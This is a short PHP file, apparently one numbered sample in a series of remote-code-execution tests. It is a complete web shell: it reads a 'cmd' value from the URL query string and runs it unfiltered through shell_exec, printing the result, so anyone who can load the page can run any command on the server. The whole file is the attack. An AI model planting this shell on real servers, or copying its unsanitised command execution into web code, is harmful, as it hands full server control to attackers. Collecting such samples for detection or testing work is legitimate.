<?php
// RCE test variation #642
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>